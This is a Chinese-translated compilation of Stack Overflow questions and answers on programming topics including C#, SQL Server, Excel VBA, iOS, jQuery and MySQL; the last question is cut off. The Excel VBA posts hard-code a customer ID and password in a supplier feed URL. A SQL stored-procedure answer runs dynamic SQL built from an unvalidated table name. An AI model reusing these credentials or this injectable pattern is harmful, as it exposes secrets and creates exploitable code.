> 时间：2012-09-28T23:39:55.197
> 
> 标签：c#, google-calendar-api

我一直在尝试使用事件更新日历，但似乎没有通过。你能评论一下我是否正确地格式化了我的活动吗？我已经为此苦苦挣扎了一段时间。

```
private void InsertEventIntoCalendar()
{
    List<EventAttendee> ef = new List<EventAttendee>();
    ef.Add(new EventAttendee{ Email = "event@gmail.com"});

    List<EventReminder> eventReminder = new List<EventReminder>();
    eventReminder.Add(new EventReminder{ Minutes = 4, Method = "email"});

    Event.RemindersData de = new Event.RemindersData();            
    de.Overrides = eventReminder;

    Event newEvent = new Event
    {
        Attendees = ef,
        Reminders  = de,       
        Summary = "Tin Roof",
        Description = "Its gonna be epic",
        Location = "Claremont",                
        Start = new EventDateTime
        {
            Date = "2012-09-30",
            DateTime = "2012-09-30T10:00:00.000-02:00",
            TimeZone = "Cape Town"

        },
        End = new EventDateTime
        {
            Date = "2012-09-30",
            DateTime = new DateTime(   "2012-09-30T10:25:00.000-02:00",
            TimeZone = "Cape Town"

        },
    };

    _service.Events.Insert(newEvent, "event@gmail.com").Fetch();

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T20:03:28.727

以防万一它帮助其他人。我想出了如何解决这个问题。我也在寻找答案并偶然发现了一个解决方案：

```
public static void GCalAdd(string summary, string location, string description,
    DateTime start, DateTime end, List<EventAttendee> attendees)
{
    try
    {
        var provider = new NativeApplicationClient(GoogleAuthenticationServer.Description)
        {
            ClientIdentifier = ClientCredentials.ClientID,
            ClientSecret = ClientCredentials.ClientSecret
        };

        var auth = new OAuth2Authenticator<NativeApplicationClient>(provider, GetAuthentication);
        var service = new CalendarService(auth);

        var curTimeZone = TimeZone.CurrentTimeZone;
        var dateOffsetStart = new DateTimeOffset(start, curTimeZone.GetUtcOffset(start));
        var dateOffsetEnd = new DateTimeOffset(end, curTimeZone.GetUtcOffset(end));
        var startTimeString = dateOffsetStart.ToString("o");
        var endTimeString = dateOffsetEnd.ToString("o");

        var evt = new Event
        {
            Summary = summary,
            Location = location,
            Description = description,
            Start = new EventDateTime { DateTime = startTimeString },
            End = new EventDateTime { DateTime = endTimeString },
            Attendees = attendees,
        };

        var insert = service.Events.Insert(evt, "primary").Fetch();

        if (insert != null)
        {
            MessageBox.Show(@"calendar item inserted");
        }
    }
    catch (Exception ex)
    {
        MessageBox.Show(ex.Message);
        return;
    }
} 
```

并且，要使用它，请执行以下操作：

```
var ea = new EventAttendee
{
    DisplayName = "testname",
    Email = "email@gmail.com",
    Organizer = false,
    Resource = false
};

var ea2 = new EventAttendee
{
    DisplayName = "testname2",
    Email = "email2@gmail.com",
    Organizer = true,
    Resource = false
};

var list = new List<EventAttendee> { ea, ea2 };

var now = DateTime.Now;
var t30 = now + TimeSpan.FromMinutes(30);

Program.GCalAdd("test event", "test location", "test description", now, t30, list); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-28T15:34:35.967

我认为提醒数据有误。看这里 -[带有 C# 的 Google Calendar API v3 - 无法插入重复异常。](http://groups.google.com/group/google-calendar-api/msg/15132f45c113eada?dmode=source)

# sql-server-2008 - 插入命令 SQL server -identity Pkey 自动增量 - 按类型的列名，在“where 条件”中

> ID：12648643
> 
> 赞同：1
> 
> 时间：2012-09-28T23:40:35.470
> 
> 标签：sql-server-2008, insert-update, identity-column

我想改变一个存储过程，所以我不会提供`identity`列名

```
INSERT INTO tablName ..... WHERE IDENTITY_Column = 10 
```

我可以告诉 sql server managment studio 仅引用该`IDENTITY`列，以便它会通过其类型（至少在我的表中是默认值）自动增量 PK ID 类型来找到它

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T19:50:48.353

您没有真正提供足够的代码让我们看到您正在尝试做的事情，而是从问题中的代码段中看到。

```
WHERE IDENTITY_Column = 10 
```

你可以使用

```
WHERE $IDENTITY = 10 
```

为此（在不指定名称的情况下过滤标识列）。

如果您确实需要查找列名，那么一种更简单的方法是避免弃用视图

```
SELECT name
FROM sys.identity_columns
WHERE object_id = object_id('dbo.YourTable') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T04:07:35.340

现在找到了这个信息。

那是简单明了的版本。

```
declare @tblName sysname = '______'--<== enter a table name

declare @NameOfIDColumn sysname =
(
SELECT Name 
FROM syscolumns
WHERE COLUMNPROPERTY( id ,name, 'IsIdentity') = 1 and OBJECT_NAME(id)= @tblName )

select  @NameOfIDColumn   AS 'result' 
```

您可以将此添加为选项以显示按记录排序的表的最后一行#

```
declare  @query VARCHAR(100) =  'Select Top 1 * FROM '+ @tblName +' Order BY ' + @IdentColumnName + ' desc' ;
EXEC (@query); 
```

并在 .net 项目中玩弄甚至将其作为测试页面，将其作为存储过程，将消息输出到测试页面。

```
declare @tblName sysname = '______'--<== enter a table name

declare @IdentColumnName sysname =
(
SELECT Name 
FROM syscolumns
WHERE COLUMNPROPERTY( id ,name, 'IsIdentity') = 1 and OBJECT_NAME(id)= @tblName )
declare @result VARCHAR (50) = @tblName + ' Identity Column is ' + @IdentColumnName;
select  @result   AS 'result' 
```

以及*Martin Smith的“身份列搜索”的更短版本*

```
declare @tblName sysname = '______'--<== enter a table name

declare @IdentColumnName sysname =
(SELECT name FROM sys.identity_columns WHERE object_id = object_id(@TableName))
declare @result VARCHAR (50) = @tblName + ' Identity Column is ' + @IdentColumnName;
select  @result   AS 'result' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-03T16:47:18.777

这与我试图通过存储过程提取的表复制技巧有关。

```
USE [YourDataBaseName]
GO
/****** Object:  StoredProcedure [dbo].[Utils_TableRowCopy]    Script Date: 10/03/2012 18:26:58 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
ALTER PROCEDURE [dbo].[Utils_TableRowCopy](
    @TableName VARCHAR(50) ,
    @RowNumberToCopy INT
)

AS
BEGIN

declare @RowIdentity sysname =
(
 SELECT name FROM sys.identity_columns WHERE object_id = object_id(@TableName)
)

    DECLARE @columns VARCHAR(5000), @query VARCHAR(8000);
    SET @query = '' ;

    SELECT @columns =
        CASE
            WHEN @columns IS NULL THEN column_name
            ELSE @columns + ',' + column_name
        END
    FROM INFORMATION_SCHEMA.COLUMNS
    WHERE (
        TABLE_NAME = LTRIM(RTRIM(@TableName))
        AND
        column_name <> LTRIM(RTRIM(@RowIdentity))
    );

    SET @query = 'INSERT INTO ' + @TableName + ' (' + @columns + ') SELECT ' + @columns + ' FROM ' + @TableName + ' WHERE ' + @RowIdentity + ' = ' + CAST(@RowNumberToCopy AS VARCHAR);

    --SELECT SCOPE_IDENTITY();
    declare  @query2 VARCHAR(100) =  ' Select Top 1 * FROM '+ @TableName +' Order BY ' + @RowIdentity + ' desc' ;
    EXEC (@query);
    EXEC (@query2);
END 
```

# excel - 在 Excel VBA 上的多行上检索到的文本

> ID：12648645
> 
> 赞同：1
> 
> 时间：2012-09-28T23:40:54.453
> 
> 标签：excel, vba

我是 Excel VBA 的新手。这就是问题所在：给定一个标识符，我想从网页中检索一些文本。理想情况下，我想将页面文本存储在单个单元格中。我创建了一个创建 QueryTable 的函数，但有时，检索到的文本会复制到多行上。

有没有办法将所有文本放在一个单元格上？

这是我的函数的代码：

```
Function Articolo(myRange As Range, code As String)
  Dim myURL As String
  Dim myName As String

  myURL = "URL;http://techstore.runner.it/feed/dettagli_csv.php?codcli=111367&pwd=03142110786&sku=" & code
  myName = "dettagli_csv.php?codcli=111367&pwd=03142110786&sku=" & code

  With ActiveSheet.QueryTables.Add(Connection:= _
    myURL _
    , Destination:=myRange)
    .Name = myName
    .FieldNames = True
    .RowNumbers = False
    .FillAdjacentFormulas = False
    .PreserveFormatting = False
    .RefreshOnFileOpen = False
    .BackgroundQuery = True
    .RefreshStyle = xlOverwriteCells
    .SavePassword = False
    .SaveData = True
    .AdjustColumnWidth = False
    .RefreshPeriod = 0
    .WebSelectionType = xlEntirePage
    .WebFormatting = xlWebFormattingNone
    .WebPreFormattedTextToColumns = False
    .WebConsecutiveDelimitersAsOne = False
    .WebSingleBlockTextImport = True
    .WebDisableDateRecognition = False
    .WebDisableRedirections = False
    .WebConsecutiveDelimitersAsOne = True
    .Refresh BackgroundQuery:=False
  End With
End Function 
```

作为测试，您可以使用 8E4374 作为代码

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T06:10:54.113

看起来来自该 URL 的数据中嵌入了回车符和换行符。这就是为什么它在excel中分成不同的单元格。

一种解决方案是运行 VBA 代码来执行查询，去掉回车/换行字符，然后将结果放入单元格中。问题是您必须运行代码来更新，而不是使用 excel 来处理刷新。

一个更简单的答案可能是使用如下公式添加另一个单元格：

```
=A1&" "&A2&" "&A3&" "&A4 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T09:50:57.340

查询表通常很慢而且很麻烦。如果您使用其中一个 httprequest 对象，它会更快，并且您可以更好地控制如何解析响应。下面是不管理会话或检查页面是否缓存的基本示例。

```
Option Explicit

Sub test()
Dim rng As Range
Dim code As String

    Set rng = Sheet1.Range("A1")
    code = "8E4374"
    Articolo rng, code

End Sub

Sub Articolo(myRange As Range, code As String)
  Dim myURL As String
  Dim myName As String

  myURL = "http://techstore.runner.it/feed/dettagli_csv.php?codcli=111367&pwd=03142110786&sku=" & code
  myRange.Value = ExecuteWebRequest(myURL)

End Sub

Function ExecuteWebRequest(ByVal url As String) As String

    Dim oXHTTP As Object

    Set oXHTTP = CreateObject("MSXML2.XMLHTTP")
    oXHTTP.Open "GET", url, False
    oXHTTP.send
    ExecuteWebRequest = oXHTTP.responseText
    Set oXHTTP = Nothing

End Function 
```

**编辑：** 上面的代码设计为作为 Sub 而不是 UDF 运行。由于 UDF 不能影响其他单元格，唯一的选择是将字符串返回到调用单元格或调用设置代码以作为事件或控件（例如按钮）运行

下面是一个示例 UDF，它是从 Excel 调用的，`=Articolo(C1)`其中 C1 是包含所需代码的任何单元格，例如 8E4374

```
Option Explicit

Function Articolo(ByVal code As String) As String
Dim myURL As String

  myURL = "http://techstore.runner.it/feed/dettagli_csv.php?codcli=111367&pwd=03142110786&sku=" & code
  Articolo = ExecuteWebRequest(myURL)

End Function

Function ExecuteWebRequest(ByVal url As String) As String
Dim oXHTTP As Object

    Set oXHTTP = CreateObject("MSXML2.XMLHTTP")
    oXHTTP.Open "GET", url, False
    oXHTTP.send
    ExecuteWebRequest = oXHTTP.responseText
    Set oXHTTP = Nothing

End Function 
```

此外，由于这是发出 http 请求，因此每次强制重新计算时，您的 UDF 也会重新计算，这可能不是您想要的，因为您可能会发出数百或数千个请求。我建议只从定义的循环中运行一次，例如

```
For Each code in Listofcodes : <Download Page> : Next code 
```

# ios - UIWebView 在以编程方式创建时不会加载或出现

> ID：12648647
> 
> 赞同：1
> 
> 时间：2012-09-28T23:41:49.560
> 
> 标签：ios, ios5, uiwebview, uiwebviewdelegate

我正在调试一个自定义`UIViewController`子类，它包装了一个`UIWebView`以便我们可以处理自定义 URL。

我似乎没有问题将相关视图添加到层​​次结构中，但是当我调用`loadRequest:`webview 时，它什么也不显示。似乎它甚至*没有*尝试执行请求 - 我的子类将自己设置为`UIWebView`的委托，但没有从它接收任何委托回调，甚至没有`webViewDidStartLoad`或`shouldStartLoadWithRequest`（！）。这可能是什么原因造成的？

以下是我班的相关代码：

```
- (void)viewDidLoad {
    [super viewDidLoad];

    // add the webview
    m_webView = [[UIWebView alloc] initWithFrame:CGRectMake(0, 0, 300, 400)];
    m_webView.delegate = self;
    m_webView.dataDetectorTypes = UIDataDetectorTypeNone;

    // adding a border to see if the view is visible onscreen
    [[m_webView layer] setBorderColor:[[UIColor darkGrayColor] CGColor]];
    [[m_webView layer] setBorderWidth:50];

    [self.view addSubview:m_webView];
}

- (void)viewWillAppear:(BOOL)animated {
    [super viewWillAppear:YES];

    NSURLRequest *request = [NSURLRequest requestFromUrl:[NSURL urlFromString:@"http://www.google.com"]];
    [self.m_webView loadRequest:request];
    NSLog(@"Loading URL: %@ in view: %@; delegate set as %@", @"http://www.google.com", m_webView, m_webView.delegate);
    NSLog(@"WebView is %@", self.m_webView.loading ? @"loading" : @"not loading");

}

- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType {
    NSLog(@"Loading URL of type %@, relative = %@", [[request URL] scheme], [[request URL] relativeString]);
    return YES;
}

- (void)webViewDidStartLoad:(UIWebView *)webView {
    NSLog(@"Started");
}

- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error {
    NSLog(@"Failed, error %@", error);
}

- (void)webViewDidFinishLoad:(UIWebView *)webView {
    NSLog(@"Finished");
    [self finishedReloading];
} 
```

以及来自控制器的父视图的代码，它试图添加这个实例的一个实例（当前位于该控制器的 viewDidLoad 方法中）：

```
ZUIWebViewController *testWebView = [[[ZUIWebViewController alloc] initWithAddress:@"deal/recentDrops"] autorelease];
[m_scrollView addSubview:testWebView.view];
[testWebView viewWillAppear:YES];
NSLog(@"Added webview"); 
```

我运行时的结果是：

```
Loading URL: http://www.google.com in view: <UIWebView: 0x1114eb30; frame = (0 0; 320 480); layer = <CALayer: 0x1114eb90>>; delegate set as <ZUIWebViewController: 0x1114d7a0>
Webview is not loading
Added webview 
```

“Added webview”消息后的视图层次结构是：

```
(lldb) po [m_scrollView recursiveDescription]
(id) $1 = 0x0a634b00 <UIView: 0xbba3430; frame = (0 20; 320 460); autoresize = W+H; layer = <CALayer: 0xbba3840>>
   | <UIImageView: 0xbba3490; frame = (0 0; 320 480); userInteractionEnabled = NO; layer = <CALayer: 0xbba3940>>
   | <UIScrollView: 0xbba4390; frame = (0 0; 320 480); clipsToBounds = YES; gestureRecognizers = <NSArray: 0xbba4680>; layer = <CALayer: 0xbba4560>; contentOffset: {0, 0}>
   |    | <UIWebView: 0xbba4840; frame = (0 0; 320 480); layer = <CALayer: 0xbba48a0>>
   |    |    | <_UIWebViewScrollView: 0xbba6b70; frame = (0 0; 320 480); clipsToBounds = YES; autoresize = H; gestureRecognizers = <NSArray: 0xbba6f40>; layer = <CALayer: 0xbba6da0>; contentOffset: {0, 0}>
   |    |    |    | <UIImageView: 0xbba7860; frame = (0 0; 54 54); transform = [-1, 0, -0, -1, 0, 0]; alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba78c0>>
   |    |    |    | <UIImageView: 0xbba77d0; frame = (0 0; 54 54); transform = [0, 1, -1, 0, 0, 0]; alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba7830>>
   |    |    |    | <UIImageView: 0xbba7740; frame = (0 0; 54 54); transform = [0, -1, 1, 0, 0, 0]; alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba77a0>>
   |    |    |    | <UIImageView: 0xbba76b0; frame = (0 0; 54 54); alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba7710>>
   |    |    |    | <UIImageView: 0xbba7620; frame = (-14.5 14.5; 30 1); transform = [0, 1, -1, 0, 0, 0]; alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba7680>>
   |    |    |    | <UIImageView: 0xbba7590; frame = (-14.5 14.5; 30 1); transform = [0, -1, 1, 0, 0, 0]; alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba75f0>>
   |    |    |    | <UIImageView: 0xbba7500; frame = (0 0; 1 30); transform = [-1, 0, -0, -1, 0, 0]; alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba7560>>
   |    |    |    | <UIImageView: 0xbba7470; frame = (0 0; 1 30); alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba74d0>>
   |    |    |    | <UIImageView: 0xbba73e0; frame = (0 450; 320 30); alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba7440>>
   |    |    |    | <UIImageView: 0xbba7380; frame = (0 0; 320 30); transform = [-1, 0, -0, -1, 0, 0]; alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = <CALayer: 0xbba72e0>>
   |    |    |    | <UIWebBrowserView: 0x13baa200; frame = (0 0; 320 480); gestureRecognizers = <NSArray: 0xbba5d50>; layer = <UIWebLayer: 0xbba4930>>
   |    |    |    |    | <TileHostLayer: 0xbba4a00> (layer)
   |    |    |    |    |    | <TileLayer: 0xbba7ef0> (layer) 
```

`UIWebView`因此，我试图显示的前面似乎没有任何东西。

什么可能导致这种情况，我应该采取任何进一步的步骤来调试吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T12:01:07.987

您正在 viewWillAppear 中加载 webview，稍后在 viewDidLoad（在 viewWillAppear 之后调用）中您正在创建一个 webview。这应该是其他方式。创建一个 webview，然后加载请求。

只需将所有内容保留在 viewDidLoad 中，否则会出现视图，创建 webview 并加载请求。这应该可以正常工作。

# ios - 如何在 iOS 中的众多 CALayers 上高效地绘制阴影？

> ID：12648648
> 
> 赞同：0
> 
> 时间：2012-09-28T23:41:56.367
> 
> 标签：ios, core-graphics, calayer

我有一些纸牌游戏使用 CALayers 来绘制个人卡片。屏幕上很容易有 40 或 50 个，通常效果很好。

我最近尝试使用 CALayers 的简单属性打开它们的阴影：

```
theCardLayer.shadowOffset = CGSizeMake(3,2);
theCardLayer.shadowOpacity = 0.7f; 
```

那时，该程序开始变得非常滞后。很公平; 一些文档说阴影可能是 CPU 密集型的。

关于如何有效地在所有东西上绘制阴影的任何想法？它们都在同一个 UIView 中的同一个 CALayer 上，所以我想知道是否有办法拉出图层的蒙版或其 UIView 和阴影，或者其他什么...

iOS5 之前的任何功能都是公平的游戏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T06:34:08.740

至少，尝试设置图层的`shadowPath`属性。它可以显着加快阴影渲染速度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T22:57:27.467

Kurt 提供了正确的解决方案。下面是一个如何使用 shadowPath 的示例：

```
UIBezierPath *thisCLPath = [UIBezierPath 
                            bezierPathWithRoundedRect:theCardLayer.bounds 
                            cornerRadius:10.0f];
theCardLayer.shadowPath = thisCLPath.CGPath; 
```

显然，我在这里使用圆角。对于直边层，您可以使用`bezierPathWithRect:`. UIBezierPath 中还有一些其他有用的方法。

结果只是在较旧的 iOS 设备（如 iPhone4 或中代 iPod Touch）上滞后，而在 iPad3 上则非常出色。

# javascript - 即使 GET 请求遇到错误，jQuery 的 .then() 也不执行 onFailure 函数

> ID：12648652
> 
> 赞同：1
> 
> 时间：2012-09-28T23:42:37.223
> 
> 标签：javascript, jquery

我试图说服[.then()](http://api.jquery.com/deferred.then/)执行它的失败条件。

我有以下。请注意，taskID 已替换为 -1 以导致失败。

```
load: function (taskID) {
    $.when(
        $('#OrderDetails').load('../../csweb/Orders/OrderDetails'),
        $('#TaskDetails').load('../../csweb/Orders/TaskDetails/?taskID=' + -1),
        $('#DeviceDetails').load('../../csweb/Orders/DeviceDetails'),
        $('#Provisioning').load('../../csweb/Orders/Provisioning'),
        $('#Activity').load('../../csweb/Orders/Activity')
    ).then(onDisplayLoadSuccess, onDisplayLoadFailure);
}

var onDisplayLoadSuccess = function () {
    console.log("onDisplayLoadSuccess!");
};

var onDisplayLoadFailure = function () {
    console.log("onDisplayLoadFailure!");
}; 
```

![在此处输入图像描述](../Images/d2da6a1c885998879e5b3e1197275a36.png)

来自[.when() 的文档](http://api.jquery.com/jQuery.when/)：

> 在将多个 Deferred 对象传递给 jQuery.when 的情况下，该方法从一个新的“主” Deferred 对象返回 Promise，该对象跟踪它已传递的所有 Deferred 的聚合状态。该方法将在所有 Deferred 解析后立即解析其 master Deferred，或者**在其中一个 Deferred 被拒绝时拒绝主 Deferred**。

由于我的一个加载请求失败了——那么不应该执行 onDisplayLoadFailure 吗？

# html - 在 asp.net-mvc 中，从 ajax 调用返回部分视图以及其他数据的最佳方法是什么？

> ID：12648654
> 
> 赞同：-1
> 
> 时间：2012-09-28T23:42:47.253
> 
> 标签：html, ajax, asp.net-mvc, json, asp.net-mvc-partialview

我有一个常规的 ajax 调用，其中服务器端返回部分视图 (html)。我现在有一种情况，我需要服务器传回部分视图之外的一些额外数据。我唯一的想法是将返回更改为 json 并将部分视图 HTML 推入 json 字段，但这似乎很麻烦。

无论如何要从服务器返回部分视图以及其他一些其他信息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-17T11:51:09.267

我选择了这个似乎可以完成工作的解决方案：http: [//craftycodeblog.com/2010/05/15/asp-net-mvc-render-partial-view-to-string/](http://craftycodeblog.com/2010/05/15/asp-net-mvc-render-partial-view-to-string/)

# html - 日文文本的 HTML 编码

> ID：12648655
> 
> 赞同：5
> 
> 时间：2012-09-28T23:43:32.533
> 
> 标签：html, character-encoding

我正在制作一个以多种语言显示礼貌文本的静态 HTML 页面。我注意到，如果我粘贴`ウェブサイトのメンテナンスの下で`到 Expression Blend 中，该文本在代码中的显示相同。我认为这对兼容性不好，应该用适当的 HTML 实体代替。

我试过[http://www.opinionatedgeek.com/DotNet/Tools/HTMLEncode/encode.aspx](http://www.opinionatedgeek.com/DotNet/Tools/HTMLEncode/encode.aspx)但它返回给我相同的日语文本。

1.  从浏览器兼容性的角度来看，将日语直接粘贴到 HTML 页面的源代码中是否正确？
2.  否则，该文本的正确 HTML 编码是什么？或者，更好的是，是否有任何工具可用于将非 ASCII 字符转换为 HTML 实体，可能是在线的并且可能是免费的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T03:12:01.920

> *我认为这对兼容性不好，应该用适当的 HTML 实体代替。*

实际上恰恰相反，您的偏好应该是不使用 html 实体，而是**正确地将文档编码声明为 UTF-8 并使用实际字符**。这样做有[很多令人信服的理由](http://htmlpurifier.org/docs/enduser-utf8.html#whyutf8)，但真正的问题是为什么*不*使用它，因为它是一个受到广泛支持的标准？

其中一些观点[之前已经总结过](https://stackoverflow.com/a/436637/1081234)：

> UTF-8 编码对于那些了解字符含义并知道如何键入的人来说更容易阅读和编辑。
> 
> UTF-8 编码对于那些不理解它们的人来说就像 HTML 实体编码一样难以理解，但它们具有呈现为特殊字符而不是难以理解的十进制或十六进制编码的优势。
> 
> [例如] Wikipedia...为了用户友好和可搜索性，实际上是通过文章并将字符实体转换为相应的真实字符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T01:35:21.090

只要您在 http 标头或元标记中将网页标记为 UTF-8，在您的网页中包含外来字符应该不是问题。或者，您可以使用 JavaScript 中的 encodeURI/decodeURI 函数对这些字符串进行编码/解码

```
encodeURI('ウェブサイトのメンテナンスの下で')
//returns"%E3%82%A6%E3%82%A7%E3%83%96%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%86%E3%83%8A%E3%83%B3%E3%82%B9%E3%81%AE%E4%B8%8B%E3%81%A7"

decodeURI("%E3%82%A6%E3%82%A7%E3%83%96%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%86%E3%83%8A%E3%83%B3%E3%82%B9%E3%81%AE%E4%B8%8B%E3%81%A7")
//returns ウェブサイトのメンテナンスの下で 
```

如果您正在寻找将一堆静态字符串转换为 unicode 字符的工具，您可以简单地使用网页开发人员控制台（mozilla/firefox 的 firebug）中的 encodeURI/decodeURI 函数。希望这可以帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T01:46:47.423

HTML 实体仅在您需要表示无法在保存文档的编码中表示的字符时才有用。例如，ASCII 没有关于如何表示“€”的规范。如果您想在 ASCII 编码的 HTML 文档中使用该字符，则必须将其编码为`&euro;`或根本不使用它。

如果您对文档使用可以表示您需要的所有字符的字符编码，例如 UTF-8，则不需要 HTML 实体。您只需要确保浏览器知道文档的编码方式，以便正确解释它。这确实是更可取的方法，因为它只是保持源代码的可读性。如果您可以简单地使用实际字符，那么想要使用 HTML 实体确实没有意义。

有关更多信息，请参阅[http://kunststube.net/frontback 。](http://kunststube.net/frontback)

# mysql - MySQL ORDER BY 订单

> ID：12648661
> 
> 赞同：0
> 
> 时间：2012-09-28T23:44:02.230
> 
> 标签：mysql, sql-order-by

在 MySQL 中，这两个查询之间有区别吗？

```
SELECT * FROM .... ORDER BY Created,Id DESC 
```

和

```
SELECT * FROM .... ORDER BY Created DESC, Id DESC 
```

期望的行为：按“创建”（时间戳）排序（降序），但是当两个项目具有相同的“创建”值时，然后回退到使用 Id 排序（降序）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:47:05.610

是，有一点不同。默认顺序是升序，所以：

```
SELECT * FROM .... ORDER BY Created,Id DESC 
```

将按`Created`升序排序，然后`Id`降序

```
SELECT * FROM .... ORDER BY Created DESC, Id DESC 
```

将按`Created`降序排序，然后`Id`降序

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:46:36.100

当然有区别。第一个按`CREATED`升序排序，然后如果有多个，则按降序对这些行进行排序`ID`。第二个先按`CREATED`降序排序，`ID`如果有多个则按降序排序。

第二个应该做你想做的。

（当然，这引出了一个问题：你为什么不自己尝试一下呢？）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T23:47:19.503

我认为第一个行不通？

你可以做

```
SELECT * FROM .... ORDER BY Created ASC, Id DESC
SELECT * FROM .... ORDER BY Created DESC, Id ASC 
```

但如果你做不同的事情，它会稍微变慢。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T23:47:53.317

在第一个中，默认 ordering( `ASC`) 用于`Created`列。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T23:52:51.900

日期的默认排序是 ASC - 升序。

因此，第一个查询将按升序排列项目，第二个查询将按降序排列。

# android - OnClick 事件未开始新活动

> ID：12648665
> 
> 赞同：0
> 
> 时间：2012-09-28T23:44:54.840
> 
> 标签：android, android-layout, android-intent, android-button

我在我的 xml 布局中创建了一个按钮，然后使用 onClick 事件来处理按钮以启动新活动。出于某种原因，当我单击按钮时，应用程序崩溃了。任何想法为什么？

我之前已经使用这种方法成功地创建了带有按钮的新活动。我不确定为什么这不起作用。

```
private Button view;

@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.stretchHow);
    view = (Button)findViewById(R.id.perfect);
    view.setOnClickListener(phase);
}

View.OnClickListener phase = new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        // TODO Auto-generated method stub
        if(view.getId() == ((Button)v).getId()){
        Intent i = new Intent(Stretch.this, Perform.class);
        startActivity(i);
        }
    }
}; 
```

这是我得到的错误。

```
09-28 23:28:37.364: E/AndroidRuntime(275): FATAL EXCEPTION: main
09-28 23:28:37.364: E/AndroidRuntime(275): java.lang.RuntimeException: Unable to start activity ComponentInfo{org.proj.fitness/org.proj.fitness.Perform}: android.content.res.Resources$NotFoundException: Resource ID #0x7f060073 type #0x12 is not valid
09-28 23:28:37.364: E/AndroidRuntime(275):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2663)
09-28 23:28:37.364: E/AndroidRuntime(275):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:36:48.060

尝试从 gen Eclipse 文件夹中删除 R 文件。然后它将被重新生成，并有望解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:52:20.497

我认为意图得到错误的上下文，因为 Stretch.this 不应该包含在 onClickListener 中。您可以尝试将其移至 Activity 中名为 startPerform 的另一个函数，如下所示：

```
View.OnClickListener phase = new View.OnClickListener() {

@Override
public void onClick(View v) {
    // TODO Auto-generated method stub
    if(view.getId() == ((Button)v).getId()){
    Intent i = new Intent(Stretch.this, Perform.class);
    startActivity(i);
    }

}
};

public void startPreform () 
{
     startActivity(new Intent(this, Perform.class));
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T23:56:44.710

这是您的错误的关键行：

```
android.content.res.Resources$NotFoundException: Resource ID #0x7f060073 type #0x12 is not valid 
```

事件可能正在触发，但目标不存在，或者处理程序期望它在哪里。请继续检查您的方法，但也要确保您没有合法的“未找到”情况。

# iphone - 具有自动建议的搜索功能

> ID：12648675
> 
> 赞同：1
> 
> 时间：2012-09-28T23:47:13.337
> 
> 标签：iphone, ios, search

我希望我的用户能够在他们在文本字段下搜索时获得选择。例如，如果我正在搜索苹果，那么在我的选择下，我会选择苹果、苹果商店等。我对这个话题很陌生。非常感谢提前！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T07:59:00.290

如果数据与您同在，您可以做到

```
if([textField.text length] > 0 || textField.text != nil)
    {
        for(int i = 0; i < [array1 count]; i++)
        {
                NSString *strName = [NSString stringWithFormat:@"%@", [[array1 objectAtIndex:i] valueForKey:@"value"]];         
                if([[strName lowercaseString] hasPrefix:[newString lowercaseString]])
                {
                    [array2 addObject:[array1 objectAtIndex:i]];
                }
            }
        }
    } 
```

将此代码添加到

```
- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string 
```

在根据您的框架`UITableView`下方添加 A。`UITextField`显示 Array2 的详细信息`UITableView`。

试试这个它可以帮助你

# php - 需要输入动态查询输出脚本

> ID：12648683
> 
> 赞同：1
> 
> 时间：2012-09-28T23:47:41.153
> 
> 标签：php, html, mysql, database

我有一个主页，其中包含一堆图像作为指向其他页面的链接，这些页面包含有关该图像的信息。

```
Image Name: $varExampleNAME
Damage: $varExampleDMG
Health: $varExampleHP
Mana: $varExampleMP 
```

